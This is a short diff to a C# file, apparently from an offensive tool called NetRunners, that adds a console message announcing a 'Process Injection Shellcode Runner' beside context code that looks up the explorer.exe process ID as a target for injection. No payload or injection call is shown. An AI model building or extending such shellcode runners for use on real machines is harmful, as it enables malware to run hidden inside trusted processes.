@@ -29,6 +29,9 @@ namespace NetRunners.Runners
                 IntPtr pRMemory;
                 Process[] explorerProcesses;
 
+                // now you know
+                Console.WriteLine("[+] Process Injection Shellcode Runner selected!");
+
                 // get explorer pid
                 explorerProcesses = Process.GetProcessesByName("explorer");
                 explorerPID = explorerProcesses[0].Id;
